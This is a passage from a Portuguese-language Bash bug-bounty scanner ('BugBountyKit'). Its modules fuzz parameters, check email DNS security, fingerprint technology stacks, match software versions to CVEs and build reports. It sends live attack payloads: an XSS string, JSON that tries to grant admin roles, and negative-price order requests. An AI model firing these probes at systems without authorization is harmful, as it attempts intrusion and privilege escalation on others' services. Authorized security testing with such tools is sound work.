        local hpp_resp; hpp_resp="$(http_get "$hpp_url")"
        if echo "$hpp_resp" | grep -qi "<script>alert(1)</script>"; then
            add_finding "HIGH" "HTTP Parameter Pollution: ${param}" \
                "Segundo valor refletido sem sanitização" "fuzzing"
            echo "HPP|${param}|reflected" >> "$fuzz_file"
        fi
    done

    # ── Integer Overflow / Type Juggling ──
    log_info "Testando Type Juggling e boundary values..."
    local boundary_payloads=(
        "2147483647" "2147483648" "-2147483648" "-2147483649"
        "9999999999999" "0.0" "0e0" "1e308" "NaN" "Infinity"
        "true" "false" "null" "[]" "{}" "undefined"
    )
    for param in "${all_params[@]:0:5}"; do
        for bp in "${boundary_payloads[@]}"; do
            local bp_resp; bp_resp="$(http_get "${base_url}/?${param}=${bp}" 2>/dev/null)"
            if echo "$bp_resp" | grep -qiE "fatal error|exception|stack trace|TypeError|ValueError" 2>/dev/null; then
                add_finding "MEDIUM" "Erro de aplicação com payload boundary: ${param}=${bp}" \
                    "Possível falha de type juggling ou integer overflow" "fuzzing"
                echo "BOUNDARY_ERROR|${param}=${bp}" >> "$fuzz_file"
                break
            fi
        done
    done

    # ── Mass Assignment via JSON ──
    log_info "Testando Mass Assignment via JSON body..."
    local ma_payloads=(
        '{"admin":true,"role":"admin","is_admin":1}'
        '{"role":"admin","user_role":"admin","privilege":"admin"}'
        '{"isAdmin":true,"elevated":true}'
    )
    for endpoint in "/api/user" "/api/profile" "/api/account" "/api/v1/user"; do
        local ep_url="${base_url}${endpoint}"
        local ep_code; ep_code="$(http_status "$ep_url")"
        if [[ "$ep_code" != "000" ]]; then
            for ma_payload in "${ma_payloads[@]}"; do
                local ma_resp; ma_resp="$(curl -s -X PUT \
                    -H "Content-Type: application/json" \
                    -d "$ma_payload" \
                    --max-time "$TIMEOUT" \
                    "$ep_url" 2>/dev/null)"
                if echo "$ma_resp" | grep -qiE '"admin":true|"role":"admin"|success' 2>/dev/null; then
                    add_finding "HIGH" "Mass Assignment em ${endpoint}" \
                        "Endpoint aceita campos privilegiados no corpo da requisição" "fuzzing"
                    echo "MASS_ASSIGNMENT|${ep_url}" >> "$fuzz_file"
                    break
                fi
            done
        fi
    done

    # ── Rate Limiting Test ──
    log_info "Testando Rate Limiting nos endpoints de login..."
    local login_endpoints=("/login" "/api/login" "/api/v1/auth" "/auth" "/signin")
    for ep in "${login_endpoints[@]}"; do
        local ep_url="${base_url}${ep}"
        local ep_code; ep_code="$(http_status "$ep_url")"
        if [[ "$ep_code" != "000" ]] && [[ "$ep_code" != "404" ]]; then
            # Enviar 10 requisições rápidas
            local blocked=false
            for i in {1..10}; do
                local r; r="$(http_status "$ep_url")"
                if [[ "$r" == "429" ]] || [[ "$r" == "503" ]]; then
                    blocked=true
                    break
                fi
            done
            if [[ "$blocked" == "false" ]]; then
                add_finding "MEDIUM" "Rate Limiting ausente em ${ep}" \
                    "10 requisições consecutivas sem throttling detectado" "fuzzing"
                echo "NO_RATE_LIMIT|${ep_url}" >> "$fuzz_file"
            else
                log_find "Rate limiting ativo em: ${ep}"
            fi
        fi
    done

    # ── Business Logic — Preço/Quantidade negativa ──
    log_info "Testando Business Logic (valores negativos/zerados)..."
    local bl_endpoints=("/cart" "/checkout" "/order" "/buy" "/purchase" "/api/cart" "/api/order")
    for ep in "${bl_endpoints[@]}"; do
        local ep_url="${base_url}${ep}"
        local ep_code; ep_code="$(http_status "$ep_url")"
        if [[ "$ep_code" != "000" ]] && [[ "$ep_code" != "404" ]]; then
            local bl_payload='{"quantity":-1,"price":-0.01,"amount":-1}'
            local bl_resp; bl_resp="$(curl -s -X POST \
                -H "Content-Type: application/json" \
                -d "$bl_payload" \
                --max-time "$TIMEOUT" \
                "$ep_url" 2>/dev/null)"
            if echo "$bl_resp" | grep -qiE '"success"|"added"|"confirmed"' 2>/dev/null; then
                add_finding "HIGH" "Business Logic flaw em ${ep}" \
                    "Endpoint aceita quantidades/preços negativos" "fuzzing"
                echo "BUSINESS_LOGIC|${ep_url}" >> "$fuzz_file"
            fi
        fi
    done

    log_info "Parameter fuzzing concluído → ${fuzz_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 19 — EMAIL SECURITY (SPF Avançado / MTA-STS / BIMI / DANE)
# ──────────────────────────────────────────────────────────────────────────────
module_email_sec() {
    local tdir="$1"
    log_sect "MÓDULO: EMAIL SECURITY AVANÇADO"

    local email_file="${tdir}/recon/email_security.txt"
    : > "$email_file"

    # ── SPF Análise Profunda ──
    log_info "Analisando SPF em profundidade..."
    local spf=""
    if check_cmd dig; then
        spf="$(dig +short TXT "$DOMAIN" 2>/dev/null | grep -i 'v=spf1' | tr -d '"' | head -1)"
    fi

    {
    echo "=== SPF Analysis ==="
    echo "$spf"
    echo ""
    } >> "$email_file"

    if [[ -z "$spf" ]]; then
        add_finding "HIGH" "SPF não configurado" \
            "Domínio ${DOMAIN} sem SPF — Email spoofing facilitado" "email_sec"
    else
        log_find "SPF: ${spf}"
        # Contar DNS lookups (limit=10)
        local lookup_count; lookup_count="$(echo "$spf" | grep -oiE '(include:|a:|mx:|exists:)' | wc -l)"
        if (( lookup_count > 10 )); then
            add_finding "MEDIUM" "SPF com muitos DNS lookups: ${lookup_count}/10" \
                "Exceder 10 lookups causa falha de SPF — permerror" "email_sec"
        fi
        # Verificar +all (permissivo demais)
        if echo "$spf" | grep -q '+all'; then
            add_finding "CRITICAL" "SPF com +all — qualquer servidor pode enviar!" \
                "Configuração SPF extremamente permissiva" "email_sec"
        fi
        # ~all vs -all
        if echo "$spf" | grep -q '~all'; then
            add_finding "LOW" "SPF usa ~all (SoftFail) em vez de -all (HardFail)" \
                "Recomendado usar -all para rejeição definitiva" "email_sec"
        fi
        echo "SPF_VALID: $spf" >> "$email_file"
    fi

    # ── DMARC Análise Profunda ──
    log_info "Analisando DMARC..."
    local dmarc=""
    if check_cmd dig; then
        dmarc="$(dig +short TXT "_dmarc.${DOMAIN}" 2>/dev/null | tr -d '"' | head -1)"
    fi

    {
    echo "=== DMARC Analysis ==="
    echo "$dmarc"
    echo ""
    } >> "$email_file"

    if [[ -z "$dmarc" ]]; then
        add_finding "HIGH" "DMARC não configurado" \
            "Domínio sem DMARC — sem relatórios e sem política de rejeição" "email_sec"
    else
        log_find "DMARC: ${dmarc}"
        if echo "$dmarc" | grep -qi 'p=none'; then
            add_finding "MEDIUM" "DMARC p=none — apenas monitoramento, sem proteção" \
                "Escalar p=quarantine ou p=reject para proteção real" "email_sec"
        elif echo "$dmarc" | grep -qi 'p=quarantine'; then
            log_warn "DMARC p=quarantine — mensagens suspeitas vão para spam"
        elif echo "$dmarc" | grep -qi 'p=reject'; then
            log_find "DMARC p=reject — máxima proteção configurada ✓"
        fi
        # rua (relatórios agregados)
        local rua; rua="$(echo "$dmarc" | grep -oiE 'rua=mailto:[^;]+' | head -1)"
        [[ -z "$rua" ]] && log_warn "DMARC sem rua — sem relatórios agregados"
        # pct
        local pct; pct="$(echo "$dmarc" | grep -oiE 'pct=[0-9]+' | cut -d= -f2)"
        [[ -n "$pct" ]] && (( pct < 100 )) && \
            add_finding "LOW" "DMARC pct=${pct}% — política aplicada parcialmente" "" "email_sec"
    fi

    # ── DKIM — múltiplos seletores comuns ──
    log_info "Testando seletores DKIM comuns..."
    local dkim_selectors=("default" "google" "k1" "k2" "smtp" "mail" "email" \
                          "dkim" "selector1" "selector2" "s1" "s2" "m1" \
                          "zendesk" "sendgrid" "mailchimp" "amazon" "ses")
    local dkim_found=0
    for sel in "${dkim_selectors[@]}"; do
        local dkim_rec=""
        if check_cmd dig; then
            dkim_rec="$(dig +short TXT "${sel}._domainkey.${DOMAIN}" 2>/dev/null | head -1)"
        fi
        if [[ -n "$dkim_rec" ]]; then
            log_find "DKIM seletor '${sel}': encontrado"
            echo "DKIM_SELECTOR: $sel | ${dkim_rec:0:80}..." >> "$email_file"
            ((dkim_found++))
            # Verificar tamanho da chave
            if echo "$dkim_rec" | grep -qi 'k=rsa'; then
                local key_len; key_len="$(echo "$dkim_rec" | grep -oE 'p=[A-Za-z0-9+/=]+' | cut -c3- | wc -c)"
                (( key_len < 200 )) && add_finding "MEDIUM" "DKIM chave RSA possivelmente curta (seletor: ${sel})" \
                    "Chaves RSA < 1024 bits são vulneráveis" "email_sec"
            fi
        fi
    done
    [[ $dkim_found -eq 0 ]] && add_finding "MEDIUM" "Nenhum seletor DKIM encontrado" "" "email_sec"

    # ── MTA-STS ──
    log_info "Verificando MTA-STS (Mail Transfer Agent Strict Transport Security)..."
    local mtasts_code; mtasts_code="$(http_status "https://mta-sts.${DOMAIN}/.well-known/mta-sts.txt")"
    if [[ "$mtasts_code" == "200" ]]; then
        local mtasts_content; mtasts_content="$(http_get "https://mta-sts.${DOMAIN}/.well-known/mta-sts.txt")"
        if echo "$mtasts_content" | grep -qi "version: STSv1"; then
            log_find "MTA-STS configurado ✓"
            if echo "$mtasts_content" | grep -qi "mode: enforce"; then
                log_find "MTA-STS modo: enforce ✓"
            else
                add_finding "LOW" "MTA-STS não em modo enforce" \
                    "Recomendado 'mode: enforce'" "email_sec"
            fi
        fi
    else
        add_finding "LOW" "MTA-STS não configurado" \
            "Email em trânsito vulnerável a downgrade STARTTLS" "email_sec"
    fi

    # ── DANE / TLSA ──
    log_info "Verificando DANE/TLSA para email..."
    local tlsa_rec=""
    if check_cmd dig; then
        tlsa_rec="$(dig +short TLSA "_25._tcp.${DOMAIN}" 2>/dev/null | head -1)"
    fi
    if [[ -n "$tlsa_rec" ]]; then
        log_find "DANE/TLSA configurado: ${tlsa_rec}"
        echo "DANE: $tlsa_rec" >> "$email_file"
    else
        log_info "DANE/TLSA não configurado (opcional)"
    fi

    # ── BIMI ──
    log_info "Verificando BIMI (Brand Indicators for Message Identification)..."
    local bimi_rec=""
    if check_cmd dig; then
        bimi_rec="$(dig +short TXT "default._bimi.${DOMAIN}" 2>/dev/null | head -1)"
    fi
    if [[ -n "$bimi_rec" ]]; then
        log_find "BIMI configurado: ${bimi_rec:0:80}"
    else
        log_info "BIMI não configurado (opcional, melhora deliverability)"
    fi

    # ── Verificar Open Relay (conexão SMTP) ──
    log_info "Verificando MX records para análise SMTP..."
    local mx_hosts=""
    if check_cmd dig; then
        mx_hosts="$(dig +short MX "$DOMAIN" 2>/dev/null | sort -n | awk '{print $2}' | sed 's/\.$//')"
    fi
    if [[ -n "$mx_hosts" ]]; then
        while IFS= read -r mx; do
            [[ -z "$mx" ]] && continue
            log_find "MX: ${mx}"
            echo "MX: $mx" >> "$email_file"
            # Testar banner SMTP
            local smtp_banner; smtp_banner="$(timeout 5 bash -c "echo 'QUIT' | nc -w 3 ${mx} 25 2>/dev/null" | head -1)"
            if [[ -n "$smtp_banner" ]]; then
                log_find "SMTP banner (${mx}): ${smtp_banner:0:80}"
                echo "SMTP_BANNER: $smtp_banner" >> "$email_file"
                # Versão de MTA exposta
                if echo "$smtp_banner" | grep -qiE "Postfix|Sendmail|Exim|Microsoft|Exchange"; then
                    add_finding "INFO" "MTA identificado via banner: ${smtp_banner:0:50}" \
                        "MX: ${mx}" "email_sec"
                fi
            fi
        done <<< "$mx_hosts"
    fi

    log_info "Email Security analysis concluída → ${email_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 20 — TECHNOLOGY STACK PROFILING
# ──────────────────────────────────────────────────────────────────────────────
module_tech_profile() {
    local tdir="$1"
    log_sect "MÓDULO: TECHNOLOGY STACK PROFILING"

    local tech_file="${tdir}/recon/tech_stack.txt"
    : > "$tech_file"

    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    local html; html="$(http_get "$base_url")"
    local headers; headers="$(http_head "$base_url")"

    declare -A TECH_STACK

    # ── Linguagens / Frameworks Backend ──
    log_info "Identificando stack de tecnologia..."

    # Por extensão de URL e headers
    if echo "$headers" | grep -qi "X-Powered-By: PHP"; then
        TECH_STACK["Backend"]="PHP"
        local php_ver; php_ver="$(echo "$headers" | grep -i 'X-Powered-By:' | grep -oE 'PHP/[0-9.]+' | head -1)"
        [[ -n "$php_ver" ]] && {
            TECH_STACK["PHP_Version"]="$php_ver"
            add_finding "LOW" "Versão PHP exposta: ${php_ver}" \
                "Header X-Powered-By revela versão" "tech"
        }
    fi
    echo "$headers" | grep -qi "X-Powered-By:.*ASP.NET" && TECH_STACK["Backend"]="ASP.NET"
    echo "$headers" | grep -qi "X-Powered-By:.*Express" && TECH_STACK["Backend"]="Node.js/Express"
    echo "$headers" | grep -qi "Server:.*Puma\|Server:.*WEBrick" && TECH_STACK["Backend"]="Ruby"
    echo "$headers" | grep -qi "Server:.*Gunicorn\|Server:.*uWSGI" && TECH_STACK["Backend"]="Python"

    # Por conteúdo HTML
    echo "$html" | grep -qi "laravel\|csrf-token" && TECH_STACK["Framework"]="Laravel"
    echo "$html" | grep -qi "codeigniter\|application/ci" && TECH_STACK["Framework"]="CodeIgniter"
    echo "$html" | grep -qi "symfony\|_token.*symfony" && TECH_STACK["Framework"]="Symfony"
    echo "$html" | grep -qi "django\|csrfmiddlewaretoken" && TECH_STACK["Framework"]="Django"
    echo "$html" | grep -qi "rails\|authenticity_token\|csrf-param" && TECH_STACK["Framework"]="Ruby on Rails"
    echo "$html" | grep -qi "spring\|javax\|jsessionid" && TECH_STACK["Framework"]="Spring/Java"
    echo "$html" | grep -qi "ASP.NET\|__VIEWSTATE\|__EVENTVALIDATION" && TECH_STACK["Framework"]="ASP.NET WebForms"
    echo "$html" | grep -qi "dotnet\|blazor" && TECH_STACK["Framework"]="ASP.NET Core/Blazor"

    # Frontend frameworks
    echo "$html" | grep -qi "react\|data-reactroot\|_reactFiber" && TECH_STACK["Frontend"]="React"
    echo "$html" | grep -qi "ng-app\|ng-version\|angular" && TECH_STACK["Frontend"]="Angular"
    echo "$html" | grep -qi "__vue__\|data-v-\|vue.js" && TECH_STACK["Frontend"]="Vue.js"
    echo "$html" | grep -qi "nuxtjs\|__nuxt" && TECH_STACK["Frontend"]="Nuxt.js"
    echo "$html" | grep -qi "next/dist\|__NEXT_DATA__" && TECH_STACK["Frontend"]="Next.js"
    echo "$html" | grep -qi "svelte\|svelte-" && TECH_STACK["Frontend"]="Svelte"
    echo "$html" | grep -qi "ember-application\|emberjs" && TECH_STACK["Frontend"]="Ember.js"

    # CSS frameworks
    echo "$html" | grep -qi "bootstrap.min.css\|bootstrap.css" && TECH_STACK["CSS"]="Bootstrap"
    echo "$html" | grep -qi "tailwind\|tw-" && TECH_STACK["CSS"]="Tailwind CSS"
    echo "$html" | grep -qi "bulma.css\|bulma.min" && TECH_STACK["CSS"]="Bulma"
    echo "$html" | grep -qi "materialize\|material-icons" && TECH_STACK["CSS"]="Materialize"
    echo "$html" | grep -qi "foundation.min.css" && TECH_STACK["CSS"]="Foundation"

    # Analytics / Trackers
    echo "$html" | grep -qi "google-analytics\|googletagmanager\|gtag" && TECH_STACK["Analytics"]="Google Analytics/GTM"
    echo "$html" | grep -qi "segment.com\|analytics.js" && TECH_STACK["Analytics"]="${TECH_STACK[Analytics]:-} Segment"
    echo "$html" | grep -qi "hotjar\|hj(" && TECH_STACK["Analytics"]="${TECH_STACK[Analytics]:-} Hotjar"
    echo "$html" | grep -qi "mixpanel" && TECH_STACK["Analytics"]="${TECH_STACK[Analytics]:-} Mixpanel"
    echo "$html" | grep -qi "facebook.com/tr\|fbevents.js" && TECH_STACK["Analytics"]="${TECH_STACK[Analytics]:-} Facebook Pixel"

    # Pagamentos
    echo "$html" | grep -qi "stripe.com/v3\|stripe.js" && TECH_STACK["Payments"]="Stripe"
    echo "$html" | grep -qi "paypal.com\|paypalobjects" && TECH_STACK["Payments"]="${TECH_STACK[Payments]:-} PayPal"
    echo "$html" | grep -qi "braintree\|braintreepayments" && TECH_STACK["Payments"]="${TECH_STACK[Payments]:-} Braintree"

    # CDN / Libs específicas
    echo "$html" | grep -qi "jquery.min.js\|jquery-" && {
        local jq_ver; jq_ver="$(echo "$html" | grep -oiE 'jquery[.-]([0-9]+\.[0-9.]+)' | grep -oE '[0-9]+\.[0-9.]+' | head -1)"
        TECH_STACK["jQuery"]="${jq_ver:-detected}"
        # jQuery < 3.5 tem XSS
        if [[ -n "$jq_ver" ]]; then
            local jq_major; jq_major="$(echo "$jq_ver" | cut -d. -f1)"
            local jq_minor; jq_minor="$(echo "$jq_ver" | cut -d. -f2)"
            if (( jq_major < 3 )) || ( (( jq_major == 3 )) && (( jq_minor < 5 )) ); then
                add_finding "HIGH" "jQuery desatualizado: v${jq_ver}" \
                    "Versões < 3.5 possuem CVEs de XSS (CVE-2020-11022/11023)" "tech"
            fi
        fi
    }

    # Banco de dados (inferido por erros ou config)
    echo "$headers" | grep -qi "mysql\|mariadb" && TECH_STACK["Database"]="MySQL/MariaDB"
    echo "$headers" | grep -qi "postgresql\|postgres" && TECH_STACK["Database"]="PostgreSQL"
    echo "$headers" | grep -qi "mssql\|sqlserver" && TECH_STACK["Database"]="MSSQL"

    # Exibir stack
    echo "" >> "$tech_file"
    echo "=== TECHNOLOGY STACK ===" >> "$tech_file"
    for tech in "${!TECH_STACK[@]}"; do
        local val="${TECH_STACK[$tech]}"
        log_find "  ${tech}: ${WHITE}${val}${RESET}"
        echo "${tech}: ${val}" >> "$tech_file"
    done

    # ── Cookies de Sessão — analisar valores para inferir tecnologia ──
    log_info "Analisando cookies de sessão..."
    local cookies_val; cookies_val="$(echo "$headers" | grep -i '^set-cookie:' | tr -d '\r')"
    if [[ -n "$cookies_val" ]]; then
        while IFS= read -r cookie_line; do
            local cname; cname="$(echo "$cookie_line" | sed 's/Set-Cookie: //i' | cut -d'=' -f1)"
            case "$cname" in
                PHPSESSID)       TECH_STACK["Session"]="PHP Session" ;;
                JSESSIONID)      TECH_STACK["Session"]="Java/JSP Session" ;;
                ASP.NET_SessionId|.ASPXAUTH)
                                 TECH_STACK["Session"]="ASP.NET Session" ;;
                laravel_session) TECH_STACK["Session"]="Laravel Session" ;;
                _rails_session)  TECH_STACK["Session"]="Rails Session" ;;
                django_session)  TECH_STACK["Session"]="Django Session" ;;
            esac
            [[ -n "${TECH_STACK[Session]:-}" ]] && \
                log_find "Session engine: ${TECH_STACK[Session]} (via cookie ${cname})"
        done <<< "$cookies_val"
    fi

    log_info "Tech profiling concluído → ${tech_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 21 — CVE / VERSÃO CHECK
# ──────────────────────────────────────────────────────────────────────────────
module_cve_check() {
    local tdir="$1"
    log_sect "MÓDULO: CVE / VERSION CHECK"

    local cve_file="${tdir}/vulns/cve_matches.txt"
    : > "$cve_file"

    # Tecnologias identificadas no tech profile
    local base_url="https://${DOMAIN}"
    local st; st="$(http_status "$base_url")"
    [[ "$st" == "000" ]] && base_url="http://${DOMAIN}"

    local headers; headers="$(http_head "$base_url")"
    local html; html="$(http_get "$base_url")"

    # ── Verificar versões conhecidamente vulneráveis ──
    log_info "Verificando versões de software contra CVEs conhecidos..."

    # Apache httpd
    local apache_ver; apache_ver="$(echo "$headers" | grep -i '^Server:.*Apache' | grep -oE 'Apache/[0-9]+\.[0-9]+\.[0-9]+' | head -1)"
    if [[ -n "$apache_ver" ]]; then
        log_find "Apache versão: ${apache_ver}"
        local ver; ver="$(echo "$apache_ver" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')"
        # CVEs Apache < 2.4.51
        local major minor patch
        IFS='.' read -r major minor patch <<< "$ver"
        if (( major == 2 )) && (( minor == 4 )) && (( patch < 51 )); then
            add_finding "HIGH" "Apache ${ver} vulnerável — CVE-2021-41773/42013 (Path Traversal RCE)" \
                "${base_url}" "cve_check"
            echo "CVE-2021-41773|Apache ${ver}|Path Traversal RCE" >> "$cve_file"
        fi
        if (( major == 2 )) && (( minor == 4 )) && (( patch < 55 )); then
            add_finding "MEDIUM" "Apache ${ver} — possíveis CVEs em versões < 2.4.55" \
                "Verificar: https://httpd.apache.org/security/vulnerabilities_24.html" "cve_check"
        fi
    fi

    # Nginx
    local nginx_ver; nginx_ver="$(echo "$headers" | grep -i '^Server:.*nginx' | grep -oE 'nginx/[0-9]+\.[0-9]+\.[0-9]+' | head -1)"
    if [[ -n "$nginx_ver" ]]; then
        log_find "Nginx versão: ${nginx_ver}"
        local nver; nver="$(echo "$nginx_ver" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')"
        local nmajor nminor npatch
        IFS='.' read -r nmajor nminor npatch <<< "$nver"
        if (( nmajor == 1 )) && (( nminor < 20 )); then
            add_finding "MEDIUM" "Nginx ${nver} — versão desatualizada, verificar CVEs" \
                "https://nginx.org/en/security_advisories.html" "cve_check"
        fi
    fi

    # PHP
    local php_ver; php_ver="$(echo "$headers" | grep -i 'X-Powered-By:' | grep -oE 'PHP/[0-9]+\.[0-9]+\.[0-9]+' | head -1)"
    if [[ -n "$php_ver" ]]; then
        log_find "PHP versão: ${php_ver}"
        local pver; pver="$(echo "$php_ver" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')"
        local pmajor pminor ppatch
        IFS='.' read -r pmajor pminor ppatch <<< "$pver"
        if (( pmajor < 8 )) || ( (( pmajor == 8 )) && (( pminor == 0 )) ); then
            add_finding "HIGH" "PHP ${pver} — versão sem suporte ativo (EOL)" \
                "Versões EOL não recebem patches de segurança" "cve_check"
        fi
        # PHP 8.1.x < 8.1.21 — CVE-2023-3247
        if (( pmajor == 8 )) && (( pminor == 1 )) && (( ppatch < 21 )); then
            add_finding "MEDIUM" "PHP ${pver} — CVE-2023-3247 possível" "" "cve_check"
        fi
    fi

    # OpenSSL via TLS handshake
    log_info "Verificando versão OpenSSL/TLS..."
    if check_cmd openssl; then
        local tls_info; tls_info="$(echo | timeout "$TIMEOUT" openssl s_client \
            -connect "${DOMAIN}:443" -servername "$DOMAIN" 2>/dev/null | \
            grep -iE 'TLSv|Protocol|Cipher Suite' | head -5)"
        if [[ -n "$tls_info" ]]; then
            echo "$tls_info" >> "$cve_file"
            echo "$tls_info" | grep -qi "TLSv1$\|TLSv1.0\|TLSv1.1" && \
                add_finding "HIGH" "TLS 1.0/1.1 habilitado — POODLE/BEAST vulnerável" \
                    "Desabilitar TLS < 1.2 imediatamente" "cve_check"
        fi
    fi

    # IIS
    local iis_ver; iis_ver="$(echo "$headers" | grep -i '^Server:.*IIS' | grep -oE 'IIS/[0-9.]+' | head -1)"
    if [[ -n "$iis_ver" ]]; then
        log_find "IIS versão: ${iis_ver}"
        local iver; iver="$(echo "$iis_ver" | grep -oE '[0-9]+')"
        (( iver < 10 )) && add_finding "MEDIUM" "IIS ${iver} — versão desatualizada" "" "cve_check"
    fi

    # WordPress versão (já pode estar no cms, mas verificar CVEs)
    local wp_ver; wp_ver="$(http_get "${base_url}/feed/" 2>/dev/null | \
        grep -oiE '<generator>https://wordpress.org/\?v=[0-9.]+</generator>' | \
        grep -oE '[0-9]+\.[0-9.]+')"
    if [[ -n "$wp_ver" ]]; then
        local wp_major wp_minor
        IFS='.' read -r wp_major wp_minor _ <<< "$wp_ver"
        if (( wp_major < 6 )) || ( (( wp_major == 6 )) && (( wp_minor < 4 )) ); then
            add_finding "HIGH" "WordPress ${wp_ver} — verificar CVEs críticos" \
                "WP < 6.4 tem múltiplas CVEs: https://wpscan.com/wordpresses/" "cve_check"
        fi
        echo "WP_VERSION_CVE: ${wp_ver}" >> "$cve_file"
    fi

    # ── Verificar CVEs via cve.circl.lu API (top softwares) ──
    log_info "Consultando CVE database para softwares detectados..."
    local software_list=()
    [[ -n "$apache_ver" ]] && software_list+=("apache:http_server")
    [[ -n "$nginx_ver"  ]] && software_list+=("nginx:nginx")
    [[ -n "$php_ver"    ]] && software_list+=("php:php")
    [[ -n "$wp_ver"     ]] && software_list+=("wordpress:wordpress")

    for sw in "${software_list[@]}"; do
        local cve_resp; cve_resp="$(http_get "https://cve.circl.lu/api/search/${sw}" 2>/dev/null)"
        if [[ -n "$cve_resp" ]] && echo "$cve_resp" | grep -q '"id":'; then
            local cve_count; cve_count="$(echo "$cve_resp" | grep -c '"id":' || echo 0)"
            log_find "CVEs encontrados para ${sw}: ${cve_count}"
            echo "CVE_SEARCH: $sw | count: $cve_count" >> "$cve_file"
        fi
    done

    log_info "CVE check concluído → ${cve_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO FINAL — RELATÓRIO HTML + MARKDOWN + JSON
# ──────────────────────────────────────────────────────────────────────────────
module_report() {
    local tdir="$1"
    log_sect "GERANDO RELATÓRIOS (MD + HTML + JSON)"

    local report_md="${tdir}/reports/bbk_report.md"
    local report_html="${tdir}/reports/bbk_report.html"
    local report_json="${tdir}/reports/bbk_report.json"
    local ip; ip="$(resolve_ip "$DOMAIN")"

    # Contagem total de vulns por arquivo
    local file_vuln_count=0
    if [[ -d "${tdir}/vulns" ]]; then
        file_vuln_count="$(find "${tdir}/vulns" -type f -name "*.txt" 2>/dev/null | \
            xargs cat 2>/dev/null | grep -c '.' || echo 0)"
    fi

    # ── RELATÓRIO MARKDOWN ──────────────────────────────────────────
    cat > "$report_md" << MD_EOF
# BugBountyKit v${VERSION} — Relatório de Segurança

**Alvo:** \`${DOMAIN}\` | **IP:** \`${ip:-N/A}\`
**Data:** $(date '+%d/%m/%Y %H:%M:%S') | **Versão:** ${SCRIPT_NAME} v${VERSION}

---

## Severidade dos Findings

| Severidade | Total |
|-----------|-------|
| 🔴 CRITICAL | **${SEVERITY_COUNT_CRITICAL}** |
| 🟠 HIGH     | **${SEVERITY_COUNT_HIGH}** |
| 🟡 MEDIUM   | **${SEVERITY_COUNT_MEDIUM}** |
| 🔵 LOW      | **${SEVERITY_COUNT_LOW}** |
| ⚪ INFO      | **${SEVERITY_COUNT_INFO}** |

---

## Findings Detalhados

MD_EOF

    for finding in "${FINDINGS_LIST[@]}"; do
        IFS='|||' read -r sev title desc mod <<< "$finding"
        echo "### [${sev}] ${title}" >> "$report_md"
        echo "- **Módulo:** ${mod}" >> "$report_md"
        echo "- **Descrição:** ${desc}" >> "$report_md"
        echo "" >> "$report_md"
    done

    # Apêndices com dados brutos
    {
    echo "---"
    echo "## Subdomínios Ativos"
    echo '```'
    [[ -f "${tdir}/subdomains/live_subdomains.txt" ]] && \
        cat "${tdir}/subdomains/live_subdomains.txt" || echo "(nenhum)"
    echo '```'
    echo ""
    echo "## Endpoints Descobertos (HTTP 200)"
    echo '```'
    [[ -f "${tdir}/web/directories.txt" ]] && \
        grep "^200" "${tdir}/web/directories.txt" 2>/dev/null || echo "(nenhum)"
    echo '```'
    echo ""
    echo "## Portas Abertas"
    echo '```'
    [[ -f "${tdir}/ports/services.txt" ]] && cat "${tdir}/ports/services.txt" || echo "(nenhum)"
    echo '```'
    echo ""
    echo "## Stack de Tecnologia"
    echo '```'
    [[ -f "${tdir}/recon/tech_stack.txt" ]] && cat "${tdir}/recon/tech_stack.txt" || echo "(não identificado)"
    echo '```'
    echo ""
    echo "---"
    echo "## Recomendações"
    echo ""
    echo "1. Corrigir todas as vulnerabilidades CRITICAL e HIGH imediatamente"
    echo "2. Implementar Security Headers (CSP, HSTS, X-Frame-Options)"
    echo "3. Configurar SPF, DMARC p=reject e DKIM corretamente"
    echo "4. Revisar exposição de buckets cloud e arquivos sensíveis"
    echo "5. Remover informações de versão dos headers HTTP"
    echo "6. Implementar rate limiting em todos os endpoints de autenticação"
    echo "7. Auditar tokens e chaves de API em código-fonte e arquivos JS"
    echo "8. Atualizar dependências com CVEs conhecidos"
    echo "9. Implementar WAF com regras atualizadas"
    echo "10. Revisar e corrigir configurações de CORS e cookies"
    echo ""
    echo "---"
    echo "*Relatório gerado em $(date) pelo ${SCRIPT_NAME} v${VERSION}*"
    echo ""
    echo "> **Aviso Legal:** Este relatório foi gerado para fins de pesquisa de segurança autorizada."
    echo "> Uso deve estar em conformidade com LGPD (Lei 13.709/2018) e Marco Civil (Lei 12.965/2014)."
    } >> "$report_md"

    log_find "Relatório Markdown: ${report_md}"

    # ── RELATÓRIO HTML INTERATIVO ───────────────────────────────────
    local crit_color="#dc2626"
    local high_color="#ea580c"
    local med_color="#ca8a04"
    local low_color="#2563eb"
    local info_color="#6b7280"

    # Gerar linhas de findings para HTML
    local findings_html=""
    for finding in "${FINDINGS_LIST[@]}"; do
        IFS='|||' read -r sev title desc mod <<< "$finding"
        local badge_color
        case "$sev" in
            CRITICAL) badge_color="$crit_color" ;;
            HIGH)     badge_color="$high_color" ;;
            MEDIUM)   badge_color="$med_color"  ;;
            LOW)      badge_color="$low_color"  ;;
            *)        badge_color="$info_color" ;;
        esac
        findings_html+="<tr>
<td><span class='badge' style='background:${badge_color}'>${sev}</span></td>
<td>${title}</td>
<td>${desc}</td>
<td><code>${mod}</code></td>
</tr>"
    done

    # Subdomínios para HTML
    local subs_html=""
    if [[ -f "${tdir}/subdomains/live_subdomains.txt" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            subs_html+="<li><code>${line}</code></li>"
        done < "${tdir}/subdomains/live_subdomains.txt"
    fi
    [[ -z "$subs_html" ]] && subs_html="<li><em>Nenhum subdomínio ativo encontrado</em></li>"

    # Diretórios para HTML
    local dirs_html=""
    if [[ -f "${tdir}/web/directories.txt" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            local dcode; dcode="$(echo "$line" | awk '{print $1}')"
            local durl;  durl="$(echo "$line"  | awk '{print $2}')"
            local dcolor="#16a34a"
            [[ "$dcode" =~ ^(401|403) ]] && dcolor="#ca8a04"
            dirs_html+="<li><span style='color:${dcolor};font-weight:bold;font-family:monospace'>[${dcode}]</span> <a href='${durl}' target='_blank'>${durl}</a></li>"
        done < "${tdir}/web/directories.txt"
    fi
